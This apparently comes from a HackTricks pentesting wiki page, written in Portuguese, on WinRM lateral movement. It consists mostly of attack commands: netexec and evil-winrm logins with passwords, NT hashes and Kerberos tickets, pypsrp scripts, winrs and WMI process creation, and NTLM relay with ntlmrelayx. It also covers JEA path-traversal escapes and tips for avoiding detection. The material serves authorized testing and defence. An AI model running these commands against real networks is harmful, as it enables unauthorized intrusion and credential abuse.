# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM é um dos meios de **lateral movement** mais convenientes em ambientes Windows, pois oferece um shell remoto por **WS-Man/HTTP(S)** sem precisar de truques de criação de serviços SMB. Se o destino expõe **5985/5986** e sua conta tem permissão para usar o remoting, muitas vezes é possível passar de "credenciais válidas" para "shell interativo" muito rapidamente.

Para a enumeração de **protocolo/serviço**, listeners, habilitação do WinRM, `Invoke-Command` e uso genérico de clientes, consulte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Por que operadores gostam do WinRM

- Usa **HTTP/HTTPS** em vez de SMB/RPC, então costuma funcionar onde a execução no estilo PsExec é bloqueada.
- Com **Kerberos**, evita enviar credenciais reutilizáveis ao destino.
- Funciona bem com ferramentas de **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- O caminho de remoting interativo do PowerShell inicia **`wsmprovhost.exe`** no destino no contexto do usuário autenticado, o que é operacionalmente diferente da execução baseada em serviços.

## Modelo de acesso e pré-requisitos

Na prática, o sucesso do lateral movement via WinRM depende de **três** coisas:

1. O destino tem um **listener WinRM** (`5985`/`5986`) e regras de firewall que permitem o acesso.
2. A conta consegue **se autenticar** no endpoint.
3. A conta tem permissão para **abrir uma sessão de remoting**.

Formas comuns de obter esse acesso:

- Ser **Local Administrator** no destino.
- Ser membro de **Remote Management Users** em sistemas mais recentes ou de **WinRMRemoteWMIUsers__** em sistemas/componentes que ainda reconhecem esse grupo.
- Ter direitos explícitos de remoting delegados por meio de descritores de segurança locais / alterações nas ACLs do PowerShell remoting.

Se você já controla uma máquina com direitos de administrador, lembre-se de que também pode **delegar acesso ao WinRM sem ser membro do grupo de administradores** usando as técnicas descritas aqui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Particularidades de autenticação relevantes para lateral movement

- **Kerberos exige um hostname/FQDN**. Se você se conectar usando um IP, o cliente geralmente recorre a **NTLM/Negotiate**.
- Em casos de **workgroup** ou entre domínios com relações de confiança, o NTLM geralmente exige **HTTPS** ou que o destino seja adicionado a **TrustedHosts** no cliente.
- Com contas locais via Negotiate em um workgroup, as restrições de acesso remoto do UAC podem impedir o acesso, a menos que a conta interna Administrator seja usada ou `LocalAccountTokenFilterPolicy=1`.
- O remoting do PowerShell usa por padrão o **SPN `HTTP/<host>`**. Em ambientes onde `HTTP/<host>` já está registrado para outra conta de serviço, o Kerberos do WinRM pode falhar com `0x80090322`; use um SPN com a porta ou mude para **`WSMAN/<host>`** quando esse SPN existir.<sup>[[3]](#references)</sup>

Se você obtiver credenciais válidas durante um password spraying, validá-las pelo WinRM costuma ser a forma mais rápida de verificar se elas permitem abrir um shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement de Linux para Windows

### NetExec / CrackMapExec para validação e execução de comando único

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM para shells interativos

`evil-winrm` continua sendo a opção interativa mais conveniente no Linux, pois oferece suporte a **senhas**, **hashes NT**, **tickets Kerberos**, **certificados de cliente**, transferência de arquivos e carregamento de PowerShell/.NET na memória.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Caso específico de Kerberos SPN: `HTTP` vs `WSMAN`

Quando o SPN padrão **`HTTP/<host>`** causa falhas de Kerberos, tente solicitar/usar um ticket **`WSMAN/<host>`**. Isso pode ocorrer em ambientes corporativos reforçados ou atípicos, nos quais **`HTTP/<host>`** já está associado a outra conta de serviço.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Isso também é útil após o abuso de **RBCD / S4U** quando você forjou ou solicitou especificamente um ticket de serviço **WSMAN**, em vez de um ticket genérico `HTTP`.

### Autenticação baseada em certificado

O WinRM também oferece suporte à **autenticação por certificado do cliente**, mas o certificado precisa estar mapeado para uma **conta local** no destino. Do ponto de vista ofensivo, isso é relevante quando:

- você roubou/exportou um certificado de cliente válido e uma chave privada já mapeados para o WinRM;
- você abusou do **AD CS / Pass-the-Certificate** para obter um certificado para um principal e, em seguida, migrou para outro método de autenticação;
- você está atuando em ambientes que evitam deliberadamente o acesso remoto baseado em senha.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

A autenticação WinRM com certificado de cliente é muito menos comum do que a autenticação por senha/hash/Kerberos, mas, quando existe, pode oferecer um caminho de **movimentação lateral sem senha** que persiste após a rotação de senhas.

### Python / automação com `pypsrp`

Se você precisa de automação em vez de um shell de operador, `pypsrp` oferece WinRM/PSRP no Python com suporte a **NTLM**, **autenticação por certificado**, **Kerberos** e **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Se você precisar de um controle mais refinado do que o wrapper de alto nível `Client`, as APIs de nível mais baixo `WSMan` + `RunspacePool` são úteis para dois problemas comuns dos operadores:

- forçar **`WSMAN`** como serviço/SPN Kerberos em vez da expectativa padrão de `HTTP` usada por muitos clientes PowerShell;
- conectar-se a um endpoint PSRP não padrão, como uma configuração de sessão **JEA** / personalizada, em vez de `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Endpoints PSRP personalizados e JEA são importantes durante o movimento lateral

Uma autenticação WinRM bem-sucedida **nem sempre** significa que você acessa o endpoint padrão e irrestrito `Microsoft.PowerShell`. Ambientes maduros podem expor **configurações de sessão personalizadas** ou endpoints **JEA**, com suas próprias ACLs e comportamento de run-as.<sup>[[1]](#references)</sup>

Se você já tem execução de código em um host Windows e quer entender quais superfícies de remoting estão disponíveis, enumere os endpoints registrados:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Quando houver um endpoint útil, direcione o acesso explicitamente para ele, em vez de usar o shell padrão:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Implicações práticas para operações ofensivas:

- Um endpoint **restrito** ainda pode ser suficiente para movimentação lateral se expuser apenas os cmdlets/funções certos para controle de serviços, acesso a arquivos, criação de processos ou execução de comandos arbitrários do .NET / externos.
- Uma função **JEA mal configurada** é especialmente valiosa quando expõe comandos perigosos como `Start-Process`, curingas abrangentes, providers graváveis ou funções proxy personalizadas que permitem escapar das restrições pretendidas.
- Endpoints respaldados por **contas virtuais RunAs** ou **gMSAs** alteram o contexto de segurança efetivo dos comandos executados. Em particular, um endpoint respaldado por gMSA pode fornecer **identidade de rede no segundo salto**, mesmo quando uma sessão WinRM comum encontraria o problema clássico de delegação.

Em um endpoint restrito personalizado, inspecione separadamente as permissões efetivas de comandos e scripts: uma lista curta de `Get-Command` não prova, por si só, que um `.ps1` existente não pode ser executado. As [capacidades de função JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) controlam explicitamente quais caminhos de script podem ser invocados; outros endpoints personalizados podem aplicar regras de sessão diferentes. Se um script permitido usa uma `SecureString` armazenada para criar uma credencial destinada a outro host, um blob criado sem uma chave explícita usa o [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) e, em geral, precisa do contexto do usuário e da máquina que o protegeu para ser descriptografado. Revise a ACL do script, a invocação permitida, a identidade usada para execução e as permissões da credencial nos sistemas subsequentes antes de considerar o código-fonte gravável ou um blob copiado como um caminho de escalonamento entre hosts. Não exiba o valor protegido durante a enumeração passiva.

Para uma função personalizada JEA que aceita um caminho de arquivo, revise em conjunto a ACL do endpoint registrado, a capacidade de função mapeada e a identidade efetiva usada para execução. Um chamador pode estar em `NoLanguage` enquanto o corpo da função é executado no modo de linguagem padrão do sistema; uma conta virtual também pode ter direitos de administrador local. Se a função verifica um diretório permitido usando um prefixo de string bruto e, depois, lê o caminho fornecido, componentes `..` podem resolver para fora desse diretório. O limite é o caminho resolvido sob a identidade da função, não o modo de linguagem do chamador nem o prefixo aparente. Confirme a função acessível e sua validação do caminho final antes de considerar a leitura de um arquivo `.psrc` ou `.pssc` como uma descoberta de leitura privilegiada de arquivos. Consulte as orientações da Microsoft sobre [capacidades de função JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) e [considerações de segurança](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Movimentação lateral no Windows usando WinRM nativo

### `winrs.exe`

`winrs.exe` é integrado ao sistema e útil quando você quer **execução nativa de comandos WinRM** sem abrir uma sessão interativa de PowerShell Remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Dois flags são fáceis de esquecer e fazem diferença na prática:

- `/noprofile` costuma ser necessário quando o principal remoto **não** é administrador local.
- `/allowdelegate` permite que o shell remoto use suas credenciais em um **terceiro host** (por exemplo, quando o comando precisa acessar `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operacionalmente, `winrs.exe` geralmente resulta em uma cadeia de processos remotos semelhante a:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Vale a pena lembrar disso, pois difere da execução baseada em serviço e das sessões interativas de PSRP.

### `winrm.cmd` / WS-Man COM em vez de PowerShell remoting

Você também pode executar comandos pelo **transporte WinRM** sem usar `Enter-PSSession`, invocando classes WMI por meio de WS-Man. O transporte continua sendo WinRM, enquanto a primitiva de execução remota passa a ser **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Essa abordagem é útil quando:

- O logging do PowerShell é monitorado intensivamente.
- Você quer **transporte WinRM**, mas não um fluxo de trabalho clássico de PS remoting.
- Você está desenvolvendo ou usando ferramentas personalizadas em torno do objeto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Quando o SMB relay é bloqueado pela assinatura e o LDAP relay é limitado, **WS-Man/WinRM** ainda pode ser um alvo de relay atraente. O `ntlmrelayx.py` moderno inclui **servidores WinRM relay** e pode fazer relay para alvos **`wsman://`** ou **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Duas observações práticas:

- Relay é mais útil quando o alvo aceita **NTLM** e o principal retransmitido tem permissão para usar WinRM.
- O código recente do Impacket trata especificamente solicitações **`WSMANIDENTIFY: unauthenticated`**, para que sondagens no estilo `Test-WSMan` não interrompam o fluxo do relay.

Para restrições de vários saltos após obter uma primeira sessão WinRM, consulte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Observações sobre OPSEC e detecção

- **Interactive PowerShell remoting** geralmente cria **`wsmprovhost.exe`** no alvo.
- **`winrs.exe`** costuma criar **`winrshost.exe`** e, em seguida, o processo filho solicitado.
- Endpoints **JEA** personalizados podem executar ações como contas virtuais **`WinRM_VA_*`** ou como um **gMSA** configurado, o que altera tanto a telemetria quanto o comportamento do segundo salto em comparação com um shell no contexto de um usuário normal.<sup>[[1]](#references)</sup>
- Espere telemetria de **logon de rede**, eventos do serviço WinRM e logs operacionais/de blocos de script do PowerShell se usar PSRP em vez de `cmd.exe` puro.
- Se precisar executar apenas um comando, `winrs.exe` ou a execução única via WinRM pode gerar menos ruído do que uma sessão interativa de remoting de longa duração.
- Se Kerberos estiver disponível, prefira **FQDN + Kerberos** a IP + NTLM para reduzir tanto os problemas de confiança quanto as alterações inconvenientes de `TrustedHosts` no lado do cliente.

## References

- [1] [Microsoft: Considerações de segurança do JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README do pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Erro `0x80090322` ao conectar o PowerShell a um servidor remoto via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
